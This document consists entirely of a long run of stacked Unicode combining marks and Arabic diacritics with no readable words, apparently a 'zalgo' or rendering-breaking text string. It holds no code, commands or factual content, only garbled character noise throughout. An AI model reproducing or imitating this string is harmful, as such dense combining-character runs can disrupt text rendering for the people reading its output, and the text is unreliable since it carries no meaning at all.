̶̶̴̷̷̷̸̴̵ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̢̧̢̨̧̧̛̛͍͙̬̻̟͙̙̼͓̲̹̭̪̯̱͎͚͇͓̮̼̜̻̱̥̖͈̯̪̹̼̦̺̗̯̭͖̞̭̭͉͋̀̀̀̊͌ͬ̇́̽ͤ͌͌̈́́̊̈́͗̀̋̀ͥ̈̋ͩͧ̍ͧ͋́̍ͫ̋͑̊͘̚͟͟͢͢͟͜͞͠͠͡ͅͅ҉̵̵̵̴̸ًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّ̡̡̢̨͎͕̘̖̞̤͕̳͕͍̟̹̫̦̮̬̱͉͈̖̪̲̠͉̞̫͕̖͕̼̰̰͇͔̙͖͔̟͈͔̞̟͑ͭͫ̏͋̊͑ͥ̍́́ͨ̃̎̋̃ͭͦ̌́͐́̄̊͛̎ͣ̀̊̍̅̄̋̀̏́̓ͬ̉̔̈͑ͦͬ̎̋̐̈̌̂͋͑͘̕̕͘̚̕͘͘̚̕͘̕̚͢͟͟͜͜͟͢͢͢͜͟͝͞͝͞͞͝͞͠ͅͅͅͅ͏̴̷̵̴ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̧̢̢͖̱͍̜̥͓̬̜̞̭̰̮͌̑̈͋ͮͪ͋̒̅̀͊͘͜͠͡͏ًٌَُِ̜̙͇̹̅̊͏̴̷ًٌٍٍَُِّّ̢̫͑̿̈҉ًٌٍَُِ̧̅͘͝͏ًًٌٌٍََُُِّّ̡̡̙̱̤̬̑̓ͦ̆ͧ̕̕͜͝͠͏ًٍَُِّ̡͖̹̜͈̤ͪͬ͡͏ٌٍِ̧̲̩͔ͦ̀̿͏̵ًًٌٍََُُِّّ̧̣͙̙̺͊̋̒́̏̕͢͠҉ًًٌٌٌٍٍٍََُُِِِّّّ̢̡̢̛̛̛̠̦̗̖̠̗̬͚͎̖̐́̊̄͛̈́ͤͫ̓͘͏ًَ̳̣̔҉ًٌٌٍٍَُُِِّّ̡̧̨͇̞͍̙̩̩̇̓̾͛̑̉ͤ̕̕͝͝͏ًٌٍَُِ̠̭̻̽ͨ͘͟͏ًَّ̙ͯ҉̴̴̵̸ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̧̧̨̛̥̺͔͕̪͖̠̜̰̙̩̲̰̬͚̤͎̇ͪ́̈́̈̅̄̾ͯ͋̉̚͘͟͟͜͡͞ͅ͏̷̸ًًٌٌٍٍََُُِِّّ̧̨̨̯͔͚̱͙̬͉̎̊̆̆̀͐͊҉̸ًًًٌٌٍٍَََُُِِّّّ̡̨̛̰̜̗͓̟̣̪̮̓́͆͐̋ͥ̃͐̀̕͞͝҉ًٌٌٍٍَُُِِّّ̢̧̛̪̝̩̥̝ͮ͌̀̀͗̈́̚̕͟͢͞͞͞ͅͅ͏̵ًًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّ̡̡̢̧̡̛̩̭̼͖̺̠͔̜̰̼̖̺̥̮̯͖͓̪̩ͪ̂̏͊ͦͦͨ̏͐̆ͯͬ͜͢͡͡͝҉̸̶ًًٌٌٍٍََُُِِّّ̧̡̝̺̘̱̩̻̑̿͐̋ͬ̀̽ͯ̑̓͜͜͡҉̸ًٌٍَُِّ͙̯̆̾̓͘͞͝ͅ҉̵̶̴ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̧̢̢̢̡̛̛̲̟̫̞͔̗̮̯̦̖̹̠͔͈̳̹̟̼̎͆ͭ̇̃ͩ̀̀̎͐̅ͫ̀̄̏̐́̓ͤ̽̉́́̕͞͞͠͠͝͝҉̶̷̵̸ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̡̛̛̩̹̺̲͓͚̟̩̫͍̪̣̝͗̒̎ͤ̆̈́͂ͩͥͬ̇̍̌ͧ͘͘͢͞͡҉̵̶̶̶̶̶̷̸̶̸̸̸̷ًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّ̨̨̡̡̧̢̧̢̧̡̨̡̛̛̛̛̛̛͈̗̺͙͈͎͕̯̫̖̝͉̗͇̱̖̣͚̥̬͍͎̱̱̺̥̲̣̰̥̰̦̩̤̜̬͚̥̜̝̥̩̱̞̠̗͚̦̱̘̾͊͆̔̌ͧ̀́̉̓ͯ͑̾ͮ̇̊́̃ͨͮ̆ͨ́̌̓͛̃͂̒́͛ͧͭ̂̈́̌̓̀ͬͯ̋ͪ̿̑̀̈́̑̃͑̓́̑́̒́̀̂́͘͘̕͘͘̕̕͟͟͟͝͞͠͠͞͠͠ͅͅ҉ًًٌٍٍََُِِّّ̛͕̣̦̜̮̞̩̑̈́̇̊͌̈͞͡͏̴̶̵ًًٌٌٌٍٍٍََُُُِِِّّ̢̢̡̛̪̻͚͚̥̙̼ͪ͋ͬ́ͦ̎̅͒̃͂́ͤͥ͘͞ͅ҉̷̸̶̶̶̶ًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّّ̧̧̧̢̧͉̘͚̟̻͕͖̤̮̞̼͉͔̀̇̓́̀̓̌̑̓̈́͊͌ͦ͗̂̓̈́ͩ̚ͅͅ҉ًٌُ̖̪͈̍҉̴̷̴̴̷̸̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِِّّّّّّّّ̡̢̡̨̜̹͇̗̟̞͕͇̙͈̠̼̖̘͕̙̪͚̰̣̭̣̞̣̦͈̞̫̝ͣͨͩ̀̊ͭ̃̉̿ͧ́̈͗̓ͩͬ͐̐ͦ͊͐̒̈̎̀̕͘͢͝͡͝͠͡ͅ͏̵̴̵ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̧̧̡̢̘̥̳̘̠̜̱̠̱̥̣̣̹̼̮̥ͤ́̈́̎̓̂̀̒͌̏̀ͦ͆͘͘̕͘͟͠͡͠͠҉̴ًًٌٍَُِّ̡̯̭̘̼̔ͯ͘͝҉̵ًٌٌٍٍَُُِِّ̢̘͈͍͇͍̋̉̀ͭ͐ͭ͘͝͏̶ًًًٌٌٌٍٍَََُُُِِِّّّ̨̨̢̧̳̜̞͚̣͎̖̻̗̣̭͒ͮ̔͑ͧ̀ͮ̃̌͒ͬ͢͠ͅ҉̷̵̶̶̸̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̧̢̠̱̜̗̻̗̰̗̖͈̣̩͕̜̤͈̩̗̤͎̹̦̞͍ͫͩ̏ͦͩͪ̾̀ͥ͊ͩ̿͆͒̀ͤ̂̽́́̂̇̓̓ͮ̑̀͑̕͘̚͢͜͟͢͠͝͝͞͡͞͠͠͏̷̴̷ًًٌٌٌٍٍََُُُِِّّ̢̡̧͉͍̼̮̪̦̹̬̤́̿͐̏̆̾̐̑͘͢͝͏̴̶̴̴̸ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̤͚̟̘̱͙̠̮̮̪͉̻̣̥̟͔͔̐ͨͭͦ̃̍ͤͬ̀̅̒̃̌̄ͧ͢͞͝͝҉ٌِ̽҉̷̸̴ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّّ̡̡̢̛̛̻̠͉̤͚͓͚̱̟̤͚̪̦̺͍ͮ̒͑ͪͧͬͥ͐̔̒ͮ̿̓̇̀̑ͮ͑ͮͦ͘͜͢͢͠͞͏̷̶̵̸̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̡̡̨̡̧̛͚̟͎̞̩̣̥̲̙̤̙̻͓̘̼̹̻͕͎̻̖̿̈́́̈́͊͗͛ͦ̽̅͊̏ͦ̃́̌̀͆̀͗̔͘̕͜͟͠͝͞ͅͅ͏ًًٌٍَُِّ̧̥̣ͭͣ̔́̾͟͝҉̶̵̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّّ̡̧̢̢̧̧̧̨̡̧̛͖̻̗͓͕̗̮̯̪̩͕̥̹̪̜͉̦̺̼̺͒̀̐͊ͯ͂͆̐̽̓̓ͤͥ̌̀ͯ͊̈͂̑̔ͧ͘͟͜͠͞͞͡͝͏̸̶̷̴ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̢̧̢̛̭̥̟̘̜̹͎̤̝̣̦̘̜̘̯͖ͨ̍̆̓̽͆̏͛̂̋̑͐̍̉̀͗̀̕͢͜͞͠͝͡ͅ҉̴ًًٌٍََُِّ̡̤̘̠̤̮̽̽ͦ̀̑̊͛͞͏̶̷̴ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̧̢̧̨̡̥̩͓͎̖̱̭̻̳̭̜̙̼̲̫̜̳̗̝͓͍͓̜̖̺̪ͤ͌͌̒ͦ͑ͬͮ́̒̍̍̑ͬ̀́̒̇ͯ̾ͨ̆͑ͬͨͨͤͪ͘͘͟͢͞͝͝͞ͅ͏̸̴̵̸̷̷ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̧̡̨̛̞̭̞̟̱͕̲̤̙̼̦̹̹̯̟̙͈̰̘̻̻̭̯̲̫͓̆̑̄͋̌̓ͫͧ̅̿́̃ͥ̍ͪ́̎̇̀́ͬ̌ͨ̽̌ͯ́̈̌͌̓͊ͮ͘͘̚͜͝͠͝҉̶ٌٍُِ̟̆̀͐͏̸̷ًٌٍَُِّّ͚̼̺͈͑ͩ̿ͬ͆̀͡҉̵̷ًًًٌٌٌٍٍَََُُُِِِّّ̡̨̡̲͉͎̹͍̬͙̺͉͍̜̺ͦ͋̓͒̽ͩ̚͜ͅ҉ٍَّ͍̄͏̴̴̷̶̸ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̨̡̛̯̹̲̬̪̖̱̥̲̦̬̘̥̩̜͈͓̬̠̳̮̞ͭ̌̌̐̃ͧͭ͊ͬ̀ͪ̋ͦ̿̇ͩ̒̉͘͘̚͢͢͡͠͝͞͡ͅ͏̶̶ًٌٍَُُِّ̧̧̲͉̮̪̝ͪ̾̔̊̈̂̂͠҉̷ًٌٌٍَُِّ̡͙̠͖̜̀̇͐̈́̀͐͐͝͠҉̷̸ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̢̡̨̧̧̛͍̥͍̪̘̠̪̥̖̭͖̞̳̜͎̘̲ͬ͗͐̔ͯ͒̊ͭ̾͒̈̊͑́ͦ̀̓̕̚͝҉̸̴̴ًًٌٌٍٍََُُِِّّ̧̢̛͙̤͎͉͔̺͕͚̣ͦ́̉́͑̈́͡҉̶̵ًًًٌٌٍٍَََُُِِّّّ͎͓̱͇͙̠͍͍͌́̀͆̽͋́̾̕͜͝͡͡͝͏̸̴̶̵̵ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̨̡̧̢̧͚̝̪͔͓̪͍̣̣̫͉̻̺̬̼̬̥͍͎̝̺͌́̂ͤͤ́͂ͤ͌ͣͣ͌̀̓́̒̋͐͌̿͊͌ͤ̕͘͘̚̕͘͢͢͞͏̵ًًٌٌٍٍََُُِِّّ̢̠̺̟̩̹͕͋̀̓ͩͫ̿͒́͊͌͡͠͠҉ًًٌٌٍَُُِّ̢̛̹͎ͧ̔̉́̋̏͏̸ًٍَِّ͕̪̲͎͘͜͏ٌٍَُِّ̠̼͚̳̳̔͛́̕͠͝ͅ҉̶ًًًٌٌٌٍٍََُُُِِّّ̡̧̢̛̬̙̝͈̝̤̳̽̀͌̔̒͌͋̅ͫ̀͠҉̵̶ًًٌٌٍٍََُُِِّّ̛͙̲̞̜̠͈͈̜͚͖̀̋̊̎ͮ̒ͤ͒͢͜͠͡҉̷̵ًًًٌٌٍٍٍَََُُِِِّّّ̯͕̘͖͔̬̭̯̱̯̝̒͋̔̏̍̀̽ͪ̅͋͘̕͟͠͠҉ٌُ̜̞͌҉ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّّ̧̨̡̨̡̡̢̰̠̜̮̤͇̱͙̭̖̩̣̖͍̙̟̭̼̏͆̍́̐͒̍̈̀̄̀̑̒̌̾ͭ̅̍͑̀̕̕̚͜͟͝҉̴̷̴̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّ̢͖̻̩͍̦̤̝̤͚̥̥̙͍̪͇̭̋ͮ͐̅ͯ̒͑́ͭͪ͒͂̍͛̐͘̚͟͟͢͟͠͝҉̸̶ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̧̧̡̨̹̺̱̩̞̺̮͇̲̤̤͖̦͍̩̫͕̝̅͗́̉͊͛̀̑̀̈͆̆́́ͬ͆̋ͭ̿̃̍̚͘͟͡͝ͅ͏ًًٌٌٌٍٍٍََُُِِِّّ̡̺͕̠̜͇͎̹̘̻͎̇͛͊̾̃͘̕͝͝҉̸ًٌٍَُِّّ̢̦͈̞̤͙ͨͣͫ̀͢͠͏̶ًًًٌٌٌٍٍَََُُُِِّّ̧̨̛̠̫̰̪̜̪̜̮͙ͧ̆̿̽̐͒ͨ̽̀́ͪ̈̂͛̕̚͜͞͏̸ًًٌٌٍٍََُُِِّّ͎̬̳̘̒̑ͪ̒̅͋ͣͭ̀͐̐̔͟͝҉̷̶̵̷ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̡̡̡̢̛̤̠͈͚̠͍͕̣̯̬͉̜̙͔̞̫̹̬̃ͣ̅͒̀ͩ̌̽̔́ͥ͑̇ͨ̔ͫ̈͂̄ͣ͜͢͢͝͝͞͞͡͝҉ٌُِ͈̾͞҉̵ًًٌٍٍََُُِّّ̢̛̫̥̣̙̘̗̂̐̅͂͒͆ͨ̾͟͏̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̡̧̨̢̧̧̛̱͕̩̻̟̣̘̻̺̜͓̰͍͚͍̼̰̟̯̹̼̮̈́́̾͋̂̍ͦ͐̎̌͒̒̎̂̉̋͒́͑ͣͣ̀̅̚͟͠͠͞͡͡͝ͅ͏ُ҉ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̧̛͙̙̗̗̬̲͈̞̫̝̯͇́̓ͣͫͪͫ̊̀̿̓́͊ͫ̀͘͢͟͜͡͏ًٌُ̤̿̀̀̀͏ٍِ̙̿҉ًًٌٍََُُِّّ̡͈̙̎ͥ̆̇̑̂̊͟ͅ҉̴̴̷ًًٌٌٍٍََُُِِّّ̖̮͕̫̖̪̜̹͔̭̓ͬ͊̾ͯ͒̿̂͊͝͠͏ٌٍِّ̘̞̰̉̕҉َ̾͏̵̵̷̸ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̛̦̹͍͓̥͙̱̟̝̦̖̜͖͖̞̱̦̯͉̻͖̤́̃ͧ̆̊̃̃̈́̇̋ͣͪ̀̀͊͆̅̀̀̕͜͢͟͠͠͡͏ُ̰҉̶̷̶̴̸̵̵̶̵̴̴̸̶̶̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̢̡̢̢̧̡̧̡̧̡̢̝̣̖͍͓̜͉͙̩͓͔̱̻͚̲̮͖̫̖͓̹̞̺̟̳͚̫̰̙̼̗͇̠̬̲̟̪̘̎̌ͩ̑̔͛͑̍̋̋̅͗̀̀̋̋͆̅ͨ́̇́ͦ̽ͯ͛͛̍̔̀́̓̅́̇͊̆͑̒͆͗̓̎̍ͥ̕͘̕͜͜͜͟͢͢͞͡͠͡͝͞҉̶ًٌُِ̛̱̝̔͏̴̵̶̵̸̷̴̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̧̨̡̡̨̛̩̺̦͙̺̙̯͉͚̰̮̺̹̫̞͔̙͕̺͇̥̦͈̭̘̹͙̺̪͔͚͉̬ͨͫͤͩͤ̊̋ͥ̾͆ͦ͑͊̅ͦͣ̓́͆ͫͭ́͆͂́͛ͣ͋́͆ͬͬ̈́̊ͫ̔̇́ͯͭ̾͘͘̕͘̚͘͢͡͡͡͠͞͝ͅ͏̷ًٌٌٍَُِِّ͙̫̰͔̘͑ͨ̀͑͏̵̷̵̵̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̛̛̝̮̩͔͓̱͍̪̖̝̭̗̺̝̯̝̪ͯͪ̔͆ͤͮ̿͛̅̈ͮ̀͋ͥ̒̍̅ͩ͘̕͘̚̕̕͟͜͟͝ͅͅ҉̷̶̵ًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̡̠̙̯̯̗̙̬͈̓̒ͨͭͪ̽̂̓ͩͯ͒̏̕͜͡͡͏̷̶̷̷̷̴̵̴̶̷̵̷̴̵̵ًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّ̡̡̨̨̨̢̢̨̡̢͍͉̟̣̺̬̬̰͖̮̗͚̩̠̼̲̗͎̯̣̪̪̼̝͙͙̱̤̖͉̝̙͚͉̱͍̭̰͉̹̼̟̻̜̪͍̪͇̳͍̇͊̈́ͦ͛̈́̅̐̽ͨ̽͛ͭ́̾ͧ̋̒ͨͦͨ̃̎̄ͫ̆͐͑ͣ̋̀̓̔̀́͊̍ͤ̐͑́̎̆̇͗͒̋͆̀̀͑͋̍ͪ̀̉̽̆̓̏̎͊̓́ͪͭ̕͘̚͘͟͟͜͜͢͟͟͢͢͟͝͞͡͞͠͝ͅͅ͏ًٌٌٍٍَُِِّّ̨̤̜̝̠̥̪̩͐́̉̓͂̔̕҉ًَ̎͂҉ٌٍُِ̮̰̹ͪ̾͏̸̵̷̷̶̴̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̨̡̧̧̧̛̛͇͎̱̫̠̙̫͕͙͓̤̘̗͉̜̮̲̪̮͕̝͙̺͓͉̠͚͇͔̭̲̫̦̪̦̅ͬͬ͆̽͆̑ͭ̀̈́̾ͥͣ̓̐̽̇̄ͣ̄͒̉̀͗́̓͂ͦ̓͘̚͢͢͢͜͜͞͞͠͠͠͝͝ͅ҉ًَُّ̺͈ͤ͛҉̴̵ًًٌٌٌٍٍََُُِِِّّ̨̫͈̺͍͖̙͔̰̇̌ͣ̃̊͋̔̋͘͡͏̸ًٌٍٍََُِّّ̢͓͈̟̞͍̊̽̈́ͫ͝ͅ҉̶ًٌٍَُِّ̡̛̣̤̘͖̭̮ͫ̇͑̈̐҉̵ًٌٍَُِّ̦̝͙̣̉ͯ̇̒̃̕͏̴ًًًًٌٌٌٌٍٍٍَََُُُُِِِّّّ̨̧̧̛̳̙̱̠͔͈̞͔̫̫͉̯͖͑́̄ͯ̽̀͆ͭ̅ͨ͋ͯ͒ͣ̅ͯ̚͘͞͠͏ًٌٍٍَُِِّ͉̭͔̺ͫ͐́́̕͜͞͏̴̴̷̵̸̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̢̨̡̢̛̯̹͇̲̦̝̼͕̣͙̞̲̟̘̞͙͙̳̱͕̀̓ͨ̿͌̿͂ͤ͒̍ͮ́̽̃ͣ͊ͯ̄ͮ̎͂ͬ́ͪ̽͘̕͘̕͢͟҉̴̶ًًًٌٌٍٍََُُِِّّ̨̧̘͚̦̮̫̻͔͇͎̼ͩ̒̾̀̍ͥ͟͜͝͏̸̴̴̵̴̸̷̷̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̨̧̢̧̨̨̨̡̧̨̛̳̪̙̗̦͓̩̫̪͙̖̦̗͙̤̞͈̠̼͉̠̖͓̱̠͔̺̭͕̬͕̭̱̞̘̞̼̱̮̫̄͋̈́̇͒͑́̇͒̉ͭ̀ͬ͗́̀́̂͑̓ͤ̈ͭ̅ͨ͒͛͌ͯͪ̐́̐̒͊̀̄̋ͭ̃̚͘̕͘͜͜͢͡͞͝͞͠͡ͅ҉̴ًًًًٌٌٌٍٍٍََََُُُِِِّّّّ̡̢͈̭͖̥͓̞̬̝̫̤̱̫̤̼̺̆̿͐̀̐͒̐̄́̂͟͟͝͡͝͞ͅ҉̶̵̴̸̶ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̨̞̣̦̳̳̪̙̻̠̼̤͕̟̝̘ͧ́ͣ̿̾ͧ́̏̿́̊̀̒̐̐̕̕̕͘͘͜͡͞҉̶ًًٌٌٍٍََُُِِّّ̡̧̫̭̮̤̭̼͈̟͚ͥͥ͗̈͂͠҉̸ًًٌٌٍََُُِّ̪̖̗͚̜̅ͪ́̒͜͢͏̷̸̸̵̶̵̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِِّّّّّّّ̡̢̡̧̧̛̘͙̻̹͕̰̲͍̞͎͎̙͎̱͎̜̣͙͇̖̫̦̜̀ͪ̅̍́́̃͐͋́ͣͪ͂ͩ̐ͦ̈́̇͂́̈̀́̂̀̋͂͟͟͢͞͡͠͞͡͡͞҉ًٌُِ̦̜͗͊̿͋͏ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̛̬̻̺̭̮̪̱̮̞̦̦͖̻͓̖͓̝̹̼̪͗ͯ̇̃ͭ́ͪ͑̆͗́̊̈́̔̀ͤ̀͋́͜͟͝͠͞͞͏̵ًٌٍٍَُِّ̜̯͖̹ͬ̈́ͣ̀ͥ͝͞͠҉ًٌَُِّ̫͔̠͓̭̒̓̾̌͢͝҉̸ًٌٍٍَُِّ̟̬͚̾̓ͪ͏̶̸̴̵̶̸̶̷̸̴̸̶ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̨̧̨̧̧̛͓̞͈̲̺̤͎͓̪̩͉̭̥̙̟̼̲̣̰͖̩̳̥̖̻̭̥̬̟̫̣̙̫̞̞̯̬̓́̐͌̄̊̀̇͒̇͒ͩ̒̆ͫͪͦ̽͌ͨͨͤ͌͋ͬ͌ͤ̌͐ͦ͒̇́̐ͤ͂̌̀̋ͩ͘͘̕͟͢͢͢͟͠͞͠͞͝͡ͅ͏̸̵̴̷̶̵̵̷ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̧̢̡̡̦̯̪̹͇͉̖̼̘̲̙̮̥̯̙͎̝̣̰͉̗͖͚̬̱͍̩͔͚͉̹̹̟̹̯͎͉̲̦̤̩̳̑͒͑̈̒̒ͬͣ̄̾ͩͨ̒͛̌͆͒̾͆̿̒͑͗̄̃ͩ̋̀͂ͤ̉̀ͭ̓̽̃͌͂̋ͫͬ̈͘̕̕͘͢͜͜͢͟͢͡͡͡͡͠͡͝͠͡͡͞ͅͅͅ͏̴̷ًٌٍٍَُِّّ̨̬̥̗̀͋ͯ͑ͫ́͘̚͘͜҉̸̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̧̜̙͉̲̝̭̂̀̑ͩ̈́̄̎̇̀̅ͩ̌̅͐ͮ̕͘͢͟ͅͅ͏̷̴ًًٌٌٍََُُِِّ̡̩͖͓͎̬̱́̽̆ͨ͗̏͊ͤ͢͏̸̴ًًٌٌٍٍٍََُُِِّّ̡̢̝̯̹͕̻͂́͗͒̈́ͦ̏́̒̕͏̶ًٌَُِّ̧̠̓́͏ًٌٍَُّ̧͉̫̥̓̒͌̀̉͠ͅ͏̶ًٌٍٍَُِِّّ̻͕̳̭ͥ̂ͮͪͤ͘͜҉ًًٌٍََُِّ̛͙̣ͬͩ̍ͨ̄̕͠͞͏̷̸̶̴̵̷̴ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̨̨̡̧̛̛̥̥̝̼̘̥̫̦̻̤̠̘̳̤̺̰̳̹̲̺̼͍͙̗͎̱̝͊̓͗ͬͦ̅ͨ͌̈ͧ̅ͮ̽͒̀̅̽̉̎͛̂ͥ̇̑̕̕͘̕͘͘͘͘͜͜͟͟͟͡͠͝͞҉̵ًًًٌٌٍٍََُُِِّّ͔̩̦̰̥̩̯͖͊̈ͯ̒ͨ̀ͤͦ̚͟͢͝͡͏̷̴̵ًًٌٌٍٍََُُِِّّ̡̛̪͔̙͒́̃̓̌̓̋̚̚҉ٌُ͛҉ٍِّ̪̜̳̽͒҉̵̵̵̷̶̵̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̧̢̡̡̧̡̢̝̫͎̘̺͇̯͍̜̬̜͙͙͔̪̗̪̳̺̤͉̲̝͈̺̮̗͖̬͚̱̥͇͙̪̝̰ͧ͗̒̏̒̋ͫͦ̔ͭ͒ͤ̇̐̽̌̅͊͛̔̋̀̐ͤ̄̔ͥ̓̏ͥͮͫ͆̄ͯͫͯ͆ͫ̕̕̕͘̕͘͜͜͟͟͟͠͡͝͡͞͠͝͠͝͏̸̷̸̵̵̶ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̡̧̧̥͕̺̩̣̖̯͓͉͕͓͚͔̟͔̘͉̬̎̀ͤ̀̽͑ͤͦͪͬ̓́̓̐̋ͮ͘̕͘͟͠͝͠͝ͅͅ҉َّ̡̱͆͏̶̶̷̴̶̵ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̧̢̛̪̦͉̟͓̳̳̱͎̙̜͙͓̤̳̖̀͗̇ͫ̌͑ͬ̀̌ͮ̂͊̀̐͋̄ͭ́ͥ͆̉̓͛̄̄͟͠͡͝ͅͅ͏̵̵̸̴̴̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̡̢̧̢̨̨̧͍̬̭͓͈̳͚̦̹̞̲̹̘̰̜̻̖̹̖̪͕͇̠̤̰͇͉͖ͧ̋ͩ̀̃ͪ̆̍ͮͥͭͯ̅͋͋́̌ͨͧ͑̌̏̔̀̽͊́ͤ̈́̾̉̐ͯ͆̚͘͜͜͟͢͠͞͠҉̸̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̱̩̜̥̣̦̲̥͇̮̝ͦͧͫ͒̓̽̃̉͋͘͜͡͡͠҉ٌٍُِ̨͎͓̫ͨ҉̴̷̴ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̡̡͈͖͍̞̥̰̜̤̮̙̻̪̦͉͎̻̲̹̍̾̍̑̉͊͆̉͋͊ͧ͛ͥͫͥͨ̄̾͛̕͘͢͟͞͞͝͞҉̵ًٌٍٍََُِّّ̛̮̝̰͋ͩ̋͠͡͏ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̧̡̡̛̱̠͙͖̯̖͔̱̬̯̭̦̆ͦ̐̐ͯ̆ͩ͊̀̑̍̓̕͘͢͢͝҉̸̶̴̷̸̴̶̶̴ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̢̡̨̢̧̧̢̡͇̪̙̬̦̟̣̰͚̝̰͍̝͉̠̞͉͚̼̖͉͎̙̻͚̱̰̮̖̳̳̆̆ͩ́́̅́̀͋ͤͩ͋ͪ͗̔͒ͯ̌̒ͣ͂͛̿͊̇̾́̏̀̊͗͑͋̾ͭ̔̿ͧ̓ͭͩ̀̈́̀̈̀͘͢͢͜͞͠͠͡͞͠҉̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̛̛̙͉͕̖̩̭̭͙͍͓̤͇̗͐̄̄̇͛̽́ͬ͐̕̕͜͟͝͝͡҉̵̶̵̵ًًًًًٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̢̧̛̤͖͈̺̦͉͇͙̪͈̠̥͕̟͆̋̈́͌͆́ͣͪͭ̃̓ͬ̉ͬ̍́͘̚̕̚͘͢͢͝͠͞